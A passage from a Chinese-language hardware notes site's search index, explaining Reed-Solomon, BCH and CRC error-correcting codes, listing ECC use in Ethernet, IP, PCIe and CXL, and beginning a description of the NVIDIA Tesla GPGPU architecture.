<p>\u200b\u53c2\u8003\u200b\uff1aHamming code</p>"},{"location":"hardware/error_detection_correction_code.html#reed-soloman","title":"Reed-Soloman","text":"<p>Reed-Solomon \u200b\u6709\u200b\u4e09\u4e2a\u200b\u53c2\u6570\u200b\uff1a\u200b\u5b57\u6bcd\u8868\u200b\u5927\u5c0f\u200b \\(q\\)\uff0c\u200b\u7f16\u7801\u200b\u540e\u200b\u7684\u200b\u5757\u200b\u5927\u5c0f\u200b \\(n\\) \u200b\u548c\u200b\u6570\u636e\u200b\u957f\u5ea6\u200b \\(k\\)\uff0c\u200b\u8981\u6c42\u200b \\(k &lt; n \\le q\\) \u200b\u4e14\u200b \\(q\\) \u200b\u662f\u200b\u7d20\u6570\u200b\u3002</p> <p>Reed-Solomon \u200b\u7b97\u6cd5\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u662f\u200b\uff0c\u200b\u5bf9\u4e8e\u200b \\(k\\) \u200b\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u6570\u636e\u200b\u8303\u56f4\u200b\u90fd\u200b\u5728\u200b \\([0, q-1]\\) \u200b\u5185\u200b\uff0c\u200b\u4ee5\u200b\u8fd9\u200b \\(k\\) \u200b\u4e2a\u6570\u200b\u4e3a\u200b\u7cfb\u6570\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(p\\)\u3002\u200b\u53d6\u200b \\(n\\) \u200b\u4e2a\u70b9\u200b \\(a_1, \\ldots a_n\\)\uff0c\u200b\u5206\u522b\u200b\u5e26\u5165\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u5bf9\u200b \\(q\\) \u200b\u53d6\u4f59\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b Reed Solomon \u200b\u7f16\u7801\u200b\uff1a</p> \\[ p_x(a) = \\sum_{i=1}^k x_ia^{i-1} \\bmod q \\] \\[ C(x) = (p_x(a_1), \\ldots, p_x(a_n)) \\] <p>\u200b\u7531\u4e8e\u200b\u4efb\u610f\u200b\u4e24\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b \\(k\\) \u200b\u6b21\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u6700\u200b\u591a\u53ea\u200b\u4f1a\u200b\u6709\u200b \\(k-1\\) \u200b\u4e2a\u200b\u4ea4\u70b9\u200b\uff0c\u200b\u6240\u4ee5\u200b Reed Solomon \u200b\u7f16\u7801\u200b\u4e2d\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b \\(n-(k-1)=n-k+1\\) \u200b\u4e2a\u503c\u200b\u90fd\u200b\u662f\u200b\u4e0d\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\u5c31\u662f\u200b \\(n-k+1\\)\u3002</p> <p>\u200b\u56e0\u6b64\u200b Reed Solomon \u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b \\((n-k)/2\\) \u200b\u4e2a\u200b\u7cfb\u6570\u200b\u7684\u200b\u9519\u8bef\u200b\u3002\u200b\u8fd9\u200b\u4f7f\u5f97\u200b Reed Solomon \u200b\u7f16\u7801\u200b\u53ef\u4ee5\u200b\u6839\u636e\u200b\u9700\u8981\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e0d\u540c\u200b\u7684\u200b\u68c0\u9519\u200b\u548c\u200b\u7ea0\u9519\u200b\u80fd\u529b\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u5982\u679c\u200b\u9519\u8bef\u200b\u4f1a\u200b\u8fde\u7eed\u200b\u51fa\u73b0\u200b\uff08erasure\uff09\uff0c\u200b\u7531\u4e8e\u200b\u4f20\u8f93\u200b\u7684\u200b\u662f\u200b\u591a\u4e2a\u200b\u503c\u200b\uff0c\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u503c\u200b\u4ea7\u751f\u200b\u7684\u200b\u591a\u4e2a\u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u548c\u200b\u4e00\u4e2a\u200b\u4f4d\u200b\u7684\u200b\u9519\u8bef\u200b\u662f\u200b\u4e00\u6837\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fde\u7eed\u200b\u9519\u8bef\u200b\u7684\u200b\u7ea0\u9519\u200b\u80fd\u529b\u200b\u66f4\u5f3a\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b\u4e0a\u9762\u200b\u8fd9\u79cd\u200b\u628a\u200b\u6570\u636e\u7f16\u7801\u200b\u4e3a\u200b\u591a\u9879\u5f0f\u200b\u7cfb\u6570\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7528\u200b\u5176\u4ed6\u200b\u65b9\u5f0f\u200b\u3002\u200b\u4f8b\u5982\u200b\u628a\u200b\u6570\u636e\u200b\u8bbe\u5b9a\u200b\u4e3a\u200b\u591a\u9879\u5f0f\u200b\u5728\u200b \\(k\\) \u200b\u4e2a\u70b9\u200b\u4e0a\u200b\u7684\u200b\u53d6\u503c\u200b\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u70b9\u200b\u7684\u200b\u503c\u200b\u901a\u8fc7\u200b\u62c9\u683c\u6717\u200b\u65e5\u200b\u63d2\u503c\u6cd5\u200b\u8ba1\u7b97\u200b\u5f97\u51fa\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u7f16\u7801\u200b\u4ee5\u540e\u200b\uff0c\u200b\u6570\u636e\u200b\u4f1a\u200b\u539f\u6837\u200b\u4fdd\u7559\u200b\u4e0b\u6765\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u9884\u5148\u200b\u8bbe\u5b9a\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(g(x)\\)\uff0c\u200b\u7f16\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8ba1\u7b97\u200b \\(s(x)=p(x)g(x)\\)\uff0c\u200b\u7136\u540e\u200b\u4f20\u8f93\u200b \\(s(x)\\) \u200b\u7684\u200b \\(n\\) \u200b\u4e2a\u200b\u7cfb\u6570\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u53eb\u505a\u200b BCH\uff08Bose\u2013Chaudhuri\u2013Hocquenghem\uff09\u3002</p> <p>\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7531\u4e8e\u200b\u8ba1\u7b97\u673a\u200b\u4f20\u8f93\u200b\u65f6\u200b\u6bcf\u4e2a\u200b\u5b57\u8282\u200b\u6709\u200b 256 \u200b\u79cd\u200b\u53d6\u503c\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u7528\u200b\u7d20\u6570\u200b \\(q\\) \u200b\u6765\u200b\u9650\u5236\u200b\u5b57\u6bcd\u8868\u200b\u5927\u5c0f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8981\u6c42\u200b \\(q\\) \u200b\u662f\u200b\u6bd4\u200b 256 \u200b\u5927\u200b\u7684\u200b\u7d20\u6570\u200b\uff0c\u200b\u4f1a\u200b\u6709\u6240\u200b\u6d6a\u8d39\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0c\u200b\u5e38\u7528\u200b\u5927\u5c0f\u200b\u4e3a\u200b 256 \u200b\u7684\u200b Galois Field \u200b\u6765\u200b\u66ff\u4ee3\u200b\u7d20\u6570\u200b\u57df\u200b\uff0c\u200b\u4e0a\u9762\u200b\u591a\u9879\u5f0f\u200b\u4e2d\u200b\u7684\u200b\u8fd0\u7b97\u200b\u90fd\u200b\u66ff\u6362\u200b\u4e3a\u200b Galois Field \u200b\u4e2d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4e00\u4e2a\u200b\u7b26\u53f7\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u3002\u200b\u4f8b\u5982\u200b RS(255,223) \u200b\u7801\u200b\uff088 \u200b\u4f4d\u200b\u7b26\u53f7\u200b\uff09\u200b\u5c31\u662f\u200b\u6bcf\u200b 223 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u5206\u4e3a\u200b\u4e00\u7ec4\u200b\uff0c\u200b\u7f16\u7801\u200b\u4e3a\u200b 255 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u200b 16 \u200b\u4e2a\u200b\u5b57\u8282\u200b\u7684\u200b\u9519\u8bef\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u5e0c\u671b\u200b\u7f29\u51cf\u200b \\(n\\)\uff0c\u200b\u53ef\u4ee5\u200b\u586b\u5145\u200b\u4e00\u90e8\u5206\u200b\u5b57\u8282\u200b\uff0c\u200b\u4f8b\u5982\u200b RS(200,168) \u200b\u7801\u200b\uff0c\u200b\u7ed9\u200b\u6570\u636e\u200b\u586b\u5145\u200b 55 \u200b\u4e2a\u200b\u96f6\u5b57\u200b\u8282\u540e\u200b\uff0c\u200b\u518d\u200b\u6309\u7167\u200b RS(255,223) \u200b\u8fdb\u884c\u200b\u7f16\u7801\u200b\uff0c\u200b\u5f97\u5230\u200b 32 \u200b\u4e2a\u200b\u6821\u9a8c\u200b\u5b57\u8282\u200b\uff0c\u200b\u4f20\u8f93\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u200b\u4f20\u8f93\u200b 168+32 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8981\u6c42\u200b\u5728\u200b Reed Solomon \u200b\u7f16\u7801\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u91c7\u7528\u200b\u4fdd\u7559\u200b\u539f\u59cb\u6570\u636e\u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002</p> <p>\u200b\u53c2\u8003\u200b\uff1aReed-Solomon error correction</p>"},{"location":"hardware/error_detection_correction_code.html#crc","title":"CRC","text":"<p>CRC \u200b\u662f\u200b\u628a\u200b\u6570\u636e\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b GF(2) \u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\uff0c\u200b\u9664\u4ee5\u200b\u5df2\u77e5\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u4f59\u6570\u200b\u5c31\u662f\u200b CRC \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002CRC \u200b\u4e3b\u8981\u200b\u662f\u200b\u4e3a\u4e86\u200b\u68c0\u6d4b\u200b\u9519\u8bef\u200b\uff0c\u200b\u4f46\u200b\u5728\u200b\u7279\u5b9a\u6761\u4ef6\u200b\u4e0b\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7ea0\u6b63\u9519\u8bef\u200b\uff0c\u200b\u4f46\u200b CRC \u200b\u4e3b\u8981\u200b\u8fd8\u662f\u200b\u7528\u6765\u200b\u68c0\u6d4b\u200b\u9519\u8bef\u200b\u3002\u200b\u6b64\u5916\u200b\uff0cCRC \u200b\u4e0d\u200b\u8981\u6c42\u200b\u6570\u636e\u200b\u957f\u5ea6\u200b\u56fa\u5b9a\u200b\u3002</p>"},{"location":"hardware/error_detection_correction_code.html#_4","title":"\u5c0f\u7ed3","text":"<p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b\u4e0d\u540c\u200b\u68c0\u9519\u200b\u7ea0\u9519\u7801\u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff1a</p> \u200b\u7f16\u8f91\u200b\u8ddd\u79bb\u200b \u200b\u6570\u636e\u200b\u4f4d\u6570\u200b \u200b\u5197\u4f59\u200b\u4f4d\u6570\u200b \u200b\u603b\u200b\u4f4d\u6570\u200b \u200b\u5947\u5076\u6821\u9a8c\u200b \\(2\\) \\(n\\) \\(1\\) \\(n+1\\) \u200b\u91cd\u590d\u200b\u7f16\u7801\u200b \\(n\\) \\(1\\) \\(n-1\\) \\(n\\) Hamming \u200b\u7801\u200b \\(3\\) \\(2^r-r-1\\) r \\(2^r-1\\) \u200b\u6269\u5c55\u200b Hamming \u200b\u7801\u200b \\(4\\) \\(2^r-r-1\\) \\(r+1\\) \\(2^r\\) Reed Solomon \\(n-k+1\\) \\(k\\log_2(q)\\) \\((n-k)\\log_2(q)\\) \\(n\\log_2(q)\\)"},{"location":"hardware/error_detection_correction_code.html#_5","title":"\u5b9e\u8df5","text":"<p>\u200b\u5f88\u591a\u200b\u534f\u8bae\u200b\u91c7\u7528\u200b\u4e86\u200b\u68c0\u9519\u200b\u7ea0\u9519\u7801\u200b\u6765\u200b\u4fdd\u8bc1\u6570\u636e\u200b\u7684\u200b\u53ef\u9760\u6027\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ol> <li>\u200b\u4ee5\u592a\u7f51\u200b FCS\uff08Frame Check Sequence\uff09\uff1a4 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b MTU \u200b\u52a0\u200b\u5934\u90e8\u200b\u5927\u5c0f\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>IP\uff08Internet Protocol\uff09\uff1a2 \u200b\u5b57\u8282\u200b\u7684\u200b Internet Checksum\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b IP \u200b\u5934\u90e8\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>PCIe TLP\uff08Transaction Layer Packet\uff09\uff1a4 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b TLP \u200b\u7684\u200b\u6570\u636e\u200b</li> <li>PCIe DLLP\uff08Data Link Layer Packet\uff09\uff1a2 \u200b\u6216\u200b 4 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b\u4e00\u4e2a\u200b DLLP \u200b\u7684\u200b\u6570\u636e\u200b</li> <li>CXL 68B FLIT\uff1a2 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c\u200b\u4fdd\u62a4\u200b 64 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>CXL Standard 256B FLIT\uff1a8 \u200b\u5b57\u8282\u200b\u7684\u200b CRC\uff0c6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC\uff0c\u200b\u4fdd\u62a4\u200b 242 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>CXL Latency Optimized 256B FLIT\uff1a\u200b\u524d\u534a\u90e8\u200b\u5206\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u4fdd\u62a4\u200b 122 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u540e\u200b\u534a\u200b\u90e8\u5206\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b CRC \u200b\u4fdd\u62a4\u200b 116 \u200b\u5b57\u8282\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u6700\u540e\u200b 6 \u200b\u5b57\u8282\u200b\u7684\u200b FEC \u200b\u4fdd\u62a4\u200b\u5b8c\u6574\u200b\u7684\u200b FLIT</li> </ol>"},{"location":"hardware/error_detection_correction_code.html#_6","title":"\u53c2\u8003\u200b\u6587\u6863","text":"<ul> <li>Error correction code</li> </ul>"},{"location":"hardware/gpgpu.html","title":"GPGPU (General Purpose Graphics Processing Unit)","text":"<p>GPGPU \u200b\u662f\u200b General Purpose Graphics Processing Unit \u200b\u7684\u200b\u7f29\u5199\u200b\uff0c\u200b\u610f\u601d\u200b\u662f\u200b\u652f\u6301\u200b\u901a\u7528\u200b\u7528\u9014\u200b\u7684\u200b\u56fe\u5f62\u200b\u5904\u7406\u5355\u5143\u200b\uff0c\u200b\u662f\u200b\u5728\u200b\u663e\u5361\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u901a\u8fc7\u200b CUDA \u200b\u7b49\u200b\u7f16\u7a0b\u200b\u63a5\u53e3\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u663e\u5361\u200b\u8fdb\u884c\u200b\u7f16\u7a0b\u200b\uff0c\u200b\u5728\u200b\u663e\u5361\u200b\u4e0a\u200b\u6267\u884c\u200b\u81ea\u5b9a\u4e49\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u5206\u6790\u200b\u4e00\u4e9b\u200b\u7ecf\u5178\u200b\u7684\u200b GPGPU \u200b\u7684\u200b\u67b6\u6784\u200b\u3002</p>"},{"location":"hardware/gpgpu.html#nvidia-tesla","title":"NVIDIA Tesla","text":"<p>\u200b\u8bba\u6587\u200b\uff1aE. Lindholm, J. Nickolls, S. Oberman and J. Montrym, \"NVIDIA Tesla: A Unified Graphics and Computing Architecture,\" in IEEE Micro, vol. 28, no. 2, pp. 39-55, March-April 2008, doi: 10.1109/MM.2008.31.</p> <p>NVIDIA Tesla \u200b\u67b6\u6784\u200b\u662f\u200b\u7b2c\u4e00\u4ee3\u200b\u652f\u6301\u200b CUDA \u200b\u7684\u200b NVIDIA \u200b\u663e\u5361\u200b\u67b6\u6784\u200b\uff0c\u200b\u4e5f\u200b\u662f\u4ece\u200b\u7eaf\u7cb9\u200b\u7684\u200b\u663e\u5361\u200b\u5230\u200b\u652f\u6301\u200b\u901a\u7528\u200b\u8ba1\u7b97\u200b\u7684\u200b GPGPU \u200b\u8f6c\u53d8\u200b\u7684\u200b\u5f00\u59cb\u200b\u3002</p> <p>\u200b\u4f20\u7edf\u200b\u7684\u200b\u663e\u5361\u200b\u6267\u884c\u200b\u7684\u200b\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u5982\u679c\u200b\u5b66\u4e60\u200b\u8fc7\u200b OpenGL\uff0c\u200b\u4f1a\u200b\u77e5\u9053\u200b\u56fe\u5f62\u200b\u6e32\u67d3\u200b\u4f1a\u200b\u91c7\u7528\u200b Graphics Pipeline\uff0c\u200b\u6240\u4ee5\u200b\u663e\u5361\u200b\u4e5f\u200b\u662f\u200b\u9488\u5bf9\u200b\u8fd9\u4e2a\u200b Pipeline \u200b\u53bb\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002\u200b\u8fd9\u4e2a\u200b Pipeline \u200b\u4e2d\u200b\u7684\u200b vertex shader \u200b\u548c\u200b fragment shader \u200b\u90e8\u5206\u200b\u5df2\u7ecf\u200b\u6709\u200b\u4e86\u200b\u53ef\u7f16\u7a0b\u200b\u7684\u200b\u80fd\u529b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u65e9\u671f\u200b\u7684\u200b GPU \u200b\u5c31\u200b\u5206\u522b\u200b\u7ed9\u200b\u8fd9\u200b\u4e24\u200b\u90e8\u5206\u200b\u8bbe\u8ba1\u200b\u5904\u7406\u5668\u200b\uff0c\u200b\u6240\u4ee5\u200b GPU \u200b\u91cc\u9762\u200b\u65e2\u6709\u200b vertex processor\uff0c\u200b\u53c8\u200b\u6709\u200b pixel-fragment processor\u3002\u200b\u5206\u5f00\u200b\u7684\u200b\u597d\u5904\u200b\u662f\u200b\u53ef\u4ee5\u200b\u5206\u522b\u200b\u4f18\u5316\u200b\uff0c\u200b\u7f3a\u70b9\u200b\u662f\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b processor \u200b\u4efb\u52a1\u91cf\u200b\u4e0d\u200b\u5339\u914d\u200b\uff0c\u200b\u5bfc\u81f4\u200b\u786c\u4ef6\u8d44\u6e90\u200b\u7684\u200b\u6d6a\u8d39\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b Tesla \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u76ee\u7684\u200b\u5c31\u662f\u200b\u7528\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b processor \u200b\u5b8c\u6210\u200b\u6240\u6709\u200b\u53ef\u7f16\u7a0b\u200b\u7684\u200b\u4efb\u52a1\u200b\uff0c\u200b\u65e2\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b\u5df2\u6709\u200b\u7684\u200b vertex shader \u200b\u548c\u200b fragment shader \u200b\u7684\u200b\u6267\u884c\u200b\uff0c\u200b\u53c8\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u672a\u6765\u200b Graphics Pipeline \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u589e\u52a0\u200b\u7684\u200b\u65b0\u200b\u7684\u200b shader \u200b\u7c7b\u578b\u200b\uff0c\u200b\u4f8b\u5982\u200b\u8bba\u6587\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b DX10 \u200b\u5f15\u5165\u200b\u7684\u200b geometry shader\u3002\u200b\u5982\u200b\u4e0d\u200b\u505a\u200b\u5408\u5e76\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6bcf\u6b21\u200b\u56fe\u5f62\u200b API \u200b\u8981\u200b\u6dfb\u52a0\u200b shader\uff0c\u200b\u786c\u4ef6\u200b\u5c31\u8981\u200b\u52a0\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b\u5355\u5143\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u590d\u6742\u5ea6\u200b\u4e0d\u53ef\u200b\u63a5\u53d7\u200b\uff0c\u200b\u800c\u4e14\u200b\u65e7\u200b\u786c\u4ef6\u200b\u4e5f\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u517c\u5bb9\u200b\u65b0\u200b\u7684\u200b API\u3002\u200b\u5408\u5e76\u200b\u4e86\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u5408\u5e76\u200b\u4ee5\u540e\u200b\u7684\u200b processor \u200b\u8db3\u591f\u200b\u901a\u7528\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u5404\u79cd\u200b shader\uff0c\u200b\u81f3\u5c11\u200b\u8ba1\u7b97\u80fd\u529b\u200b\u4e0a\u200b\u4e0d\u4f1a\u200b\u6709\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ea\u662f\u200b\u8bf4\u200b\u662f\u5426\u200b\u9700\u8981\u200b\u9488\u5bf9\u200b\u67d0\u4e9b\u200b shader \u200b\u53bb\u200b\u505a\u200b\u4f18\u5316\u200b\u3002</p> <p>\u200b\u65e2\u7136\u200b\u786e\u5b9a\u200b\u4e86\u200b\u8981\u200b\u7528\u200b\u4e00\u4e2a\u200b\u5355\u72ec\u200b\u7684\u200b processor \u200b\u6765\u200b\u5b8c\u6210\u200b\u6240\u6709\u200b\u7684\u200b\u53ef\u7f16\u7a0b\u200b\u7684\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5c31\u200b\u6765\u200b\u4ecb\u7ecd\u200b\u8fd9\u4e2a\u200b processor \u200b\u662f\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u7684\u200b\u3002\u200b\u4ee5\u200b GeForce 8800 GPU (G80) \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u6709\u200b 8 \u200b\u4e2a\u200b Texture Processor Cluster (TPC)\uff0c\u200b\u6bcf\u4e2a\u200b TPC \u200b\u5185\u90e8\u200b\u6709\u200b\u4e24\u4e2a\u200b Streaming Multiprocessor\uff08SM\uff09\uff0c\u200b\u6bcf\u4e2a\u200b SM \u200b\u91cc\u9762\u200b\u6709\u200b 8 \u200b\u4e2a\u200b Streaming Processor\uff08SP\uff09\u3002\uff08<code>a GeForce 8800 GPU with 128 streaming-processor (SP) cores organized as 16 streaming multiprocessors (SMs) in eight independent processing units called texture/processor clusters (TPCs).</code>\uff09\u200b\u800c\u200b\u5177\u4f53\u200b\u6267\u884c\u200b\u8ba1\u7b97\u200b\u7684\u200b\u5c31\u662f\u200b SP\uff0c\u200b\u8fdb\u884c\u200b\u6574\u6570\u200b\u3001\u200b\u6d6e\u70b9\u8fd0\u7b97\u200b\u7b49\u7b49\u200b\u3002\u200b\u67b6\u6784\u56fe\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> Tesla \u200b\u67b6\u6784\u200b\u603b\u89c8\u200b\uff08\u200b\u6765\u6e90\u200b\uff1aNVIDIA Tesla: A Unified Graphics and Computing Architecture Figure 1\uff09 <p>\u200b\u56fe\u200b\u7684\u200b\u4e0a\u65b9\u200b\u662f\u200b Host CPU\uff0cCPU \u200b\u901a\u8fc7\u200b PCIe \u200b\u7b49\u200b\u65b9\u5f0f\u200b\u8bbf\u95ee\u200b GPU\u3002\u200b\u6839\u636e\u200b\u8981\u200b\u8fdb\u884c\u200b\u7684\u200b\u4efb\u52a1\u200b\u7c7b\u578b\u200b\uff0c\u200b\u7ecf\u8fc7\u200b\u4e0d\u540c\u200b\u7c7b\u578b\u200b\u7684\u200b\u9884\u5904\u7406\u200b\uff0c\u200b\u4f46\u200b\u6700\u7ec8\u200b Vertex/Pixel/Compute \u200b\u4efb\u52a1\u200b\u90fd\u200b\u4f1a\u200b\u901a\u8fc7\u200b Streaming Processor Array (SPA)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b TPC-SM-SP \u200b\u4e09\u200b\u5c42\u6b21\u200b\u7ec4\u6210\u200b\u7684\u200b\u5927\u91cf\u200b\u8ba1\u7b97\u200b\u6838\u5fc3\u200b\u6765\u200b\u8fdb\u884c\u200b\u3002\u200b\u8fd9\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u524d\u9762\u200b\u8bf4\u200b\u7684\u200b\uff0c\u200b\u628a\u200b\u539f\u6765\u200b\u5206\u522b\u200b\u5b8c\u6210\u200b\u7684\u200b\u4efb\u52a1\u200b\uff0c\u200b\u7edf\u4e00\u200b\u5230\u200b\u76f8\u540c\u200b\u7684\u200b processor \u200b\u6765\u200b\u5b8c\u6210\u200b\u3002\u200b\u9664\u4e86\u200b\u8ba1\u7b97\u200b\u4ee5\u5916\u200b\uff0c\u200b\u9488\u5bf9\u200b texture \u200b\u548c\u200b raster \u200b\u7b49\u200b\u56fe\u5f62\u200b\u76f8\u5173\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u8bbe\u8ba1\u200b\u4e86\u200b\u5355\u72ec\u200b\u7684\u200b\u786c\u4ef6\u200b\u6765\u200b\u52a0\u901f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6bcf\u4e2a\u200b TPC \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b Texture unit \u200b\u548c\u200b Texture L1\uff0c\u200b\u5728\u200b L2 Slice \u200b\u65c1\u8fb9\u200b\u8fd8\u6709\u200b Raster operation processor (ROP)\u3002\u200b\u867d\u7136\u200b\u6709\u200b L2 \u200b\u7f13\u5b58\u200b\uff0c\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u7f13\u5b58\u200b\u4ec5\u200b\u7528\u4e8e\u200b\u7eb9\u7406\u200b\u5904\u7406\u200b\uff0c\u200b\u800c\u200b\u6ca1\u6709\u200b\u7528\u4e8e\u200b SPA\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u6846\u67b6\u200b\u4e0b\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53bb\u200b\u5b9e\u73b0\u200b Graphics Pipeline \u200b\u4e86\u200b\u3002\u200b\u56fe\u4e2d\u200b\u7684\u200b Input assembler \u200b\u6536\u96c6\u200b vertex shader \u200b\u8ba1\u7b97\u200b\u9700\u8981\u200b\u7684\u200b\u5404\u79cd\u200b\u56fe\u5f62\u200b\u4fe1\u606f\u200b\uff0c\u200b\u7136\u540e\u200b Vertex work distribution \u200b\u901a\u8fc7\u200b round-robin \u200b\u7684\u200b\u65b9\u5f0f\u200b \u200b\u628a\u200b vertex shader \u200b\u8ba1\u7b97\u200b\u4efb\u52a1\u200b\u5206\u53d1\u200b\u5230\u200b SPA \u200b\u4e0a\u200b\u3002\u200b\u4e8e\u662f\u200b SPA \u200b\u5c31\u200b\u4f1a\u200b\u6267\u884c\u200b vertex shader \u200b\u7684\u200b\u4ee3\u7801\u200b\u3002vertex shader \u200b\u7684\u200b\u8f93\u51fa\u200b\u4f1a\u200b\u7ee7\u7eed\u200b\u7559\u5728\u200b GPGPU \u200b\u4e0a\u200b\uff0c\u200b\u5230\u200b pixel-fragment processing \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53c8\u200b\u662f\u200b\u7531\u200b SPA \u200b\u6765\u200b\u6267\u884c\u200b fragment shader \u200b\u7684\u200b\u4ee3\u7801\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u63a5\u4e0b\u6765\u200b\u6765\u770b\u200b TPC 